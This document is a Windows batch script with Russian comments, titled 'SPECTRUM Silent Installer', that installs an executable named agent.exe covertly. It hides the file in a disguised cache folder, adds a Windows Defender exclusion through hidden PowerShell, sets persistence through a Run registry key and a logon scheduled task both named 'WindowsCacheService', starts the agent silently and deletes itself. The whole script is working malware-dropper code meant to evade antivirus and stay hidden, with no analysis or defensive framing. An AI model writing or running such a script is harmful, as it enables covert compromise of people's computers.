@echo off
:: ============================================
:: SPECTRUM Silent Installer v4.0
:: Установка agent.exe без Python, без админа
:: ============================================

set "targetDir=%LOCALAPPDATA%\Microsoft\Windows\INetCache\Cache"

:: Создаём папку
if not exist "%targetDir%" mkdir "%targetDir%"

:: Скрываем папку
attrib +h "%targetDir%" >nul 2>&1

:: Копируем agent.exe из временной папки в целевую
xcopy "%~dp0agent.exe" "%targetDir%\" /Y /I /H >nul 2>&1

:: Скрываем agent.exe
attrib +h "%targetDir%\agent.exe" >nul 2>&1

:: Добавляем в исключения Defender
powershell -NoP -NonI -W Hidden -Command "Add-MpPreference -ExclusionPath '%targetDir%' -Force" >nul 2>&1

:: Автозагрузка — Реестр
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "WindowsCacheService" /t REG_SZ /d "\"%targetDir%\agent.exe\"" /f >nul 2>&1

:: Автозагрузка — Планировщик
schtasks /create /tn "WindowsCacheService" /tr "\"%targetDir%\agent.exe\"" /sc ONLOGON /ru %USERNAME% /f >nul 2>&1

:: Запускаем агента
start "" /B "%targetDir%\agent.exe" >nul 2>&1

:: Самоуничтожение
ping 127.0.0.1 -n 3 >nul
del "%~f0" >nul 2>&1
exit